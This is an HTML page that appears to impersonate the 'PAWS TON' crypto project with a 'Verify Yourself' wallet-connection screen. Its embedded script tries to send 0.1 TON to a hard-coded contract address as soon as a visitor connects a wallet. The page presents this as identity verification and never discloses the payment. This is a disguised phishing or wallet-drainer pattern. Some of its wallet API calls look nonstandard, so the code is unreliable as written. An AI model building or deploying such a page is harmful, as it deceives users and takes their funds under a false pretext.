<!DOCTYPE html>
<html>
<head>
    <base href="https://hasan199191.github.io/my-ton-app/">
    <meta charset="utf-8">
    <title>PAWS TON | Home</title>
    <meta name="description" content="Animals are done! It's PAWS Season">
    <meta property="og:title" content="PAWS TON | Home">
    <meta property="theme-color" content="#0D0D0D">
    <meta name="viewport" content="width=device-width, user-scalable=no, shrink-to-fit=no, viewport-fit=cover">
    
    <!-- Icons -->
    <link rel="icon" href="assets/favicon.ico">
    <link rel="icon" href="assets/favicon-32x32.png" sizes="32x32">
    <link rel="icon" href="assets/icons/72.png" sizes="72x72">
    <link rel="icon" href="assets/icons/96.png" sizes="96x96">
    <link rel="icon" href="assets/icons/144.png" sizes="144x144">
    <link rel="icon" href="assets/icons/192.png" sizes="192x192">
    
    <!-- Preload Images -->
    <link rel="preload" as="image" href="assets/shape1.png" fetchpriority="high">
    <link rel="preload" as="image" href="assets/shape2.png" fetchpriority="high">
    <link rel="preload" as="image" href="assets/shape3.png" fetchpriority="high">
    <link rel="preload" as="image" href="assets/shape4.png" fetchpriority="high">

    <style>
        :root {
            --background: #0D0D0D;
            --text: #ffffff;
        }

        body {
            margin: 0;
            background: var(--background);
            color: var(--text);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            overflow-x: hidden;
        }

        .verify-section {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
            padding: 2rem;
        }

        .shape {
            position: absolute;
            pointer-events: none;
        }

        .shape1 { top: 0; left: 0; width: 40%; }
        .shape2 { top: 20%; right: 0; width: 35%; }
        .shape3 { bottom: 20%; left: 0; width: 45%; }
        .shape4 { bottom: 0; right: 0; width: 40%; }

        .content {
            position: relative;
            z-index: 2;
            text-align: center;
        }

        .verify-title {
            font-size: 4rem;
            margin-bottom: 1.5rem;
            font-weight: 700;
        }

        .verify-description {
            font-size: 1.2rem;
            max-width: 600px;
            margin-bottom: 3rem;
            opacity: 0.8;
        }

        .wallet-container {
            padding: 1rem;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            backdrop-filter: blur(10px);
        }

        #ton-connect-button {
            display: block !important;
        }
    </style>
</head>
<body>
    <section class="verify-section">
        <img src="assets/shape1.png" class="shape shape1" alt="">
        <img src="assets/shape2.png" class="shape shape2" alt="">
        <img src="assets/shape3.png" class="shape shape3" alt="">
        <img src="assets/shape4.png" class="shape shape4" alt="">
        
        <div class="content">
            <h1 class="verify-title">Verify Yourself</h1>
            <p class="verify-description">Connect your TON wallet to verify your identity and access exclusive features.</p>
            <div class="wallet-container">
                <div id="ton-connect-button"></div>
            </div>
        </div>
    </section>

    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script>
        const CONTRACT_ADDRESS = "EQA0i8-CdGnF_DhUHHf92R1ONH6sIA9vLZ_WLcCIhfBBXwtG";

        document.addEventListener('DOMContentLoaded', () => {
            setTimeout(() => {
                if (window.TONConnect) {
                    const tonConnectUI = new window.TONConnect.UI({
                        manifestUrl: 'https://hasan199191.github.io/my-ton-app/tonconnect-manifest.json',
                        buttonRootId: 'ton-connect-button'
                    });

                    // Handle wallet connection
                    tonConnectUI.onStatusChange(async (wallet) => {
                        if (wallet) {
                            try {
                                const provider = window.ton;
                                const contract = new provider.Contract({
                                    address: CONTRACT_ADDRESS
                                });

                                await contract.methods.verify().send({
                                    from: wallet.account.address,
                                    amount: '0.1'
                                });
                            } catch (error) {
                                console.error("Contract interaction failed:", error);
                            }
                        }
                    });
                }
            }, 1000);
        });
    </script>
</body>
</html>
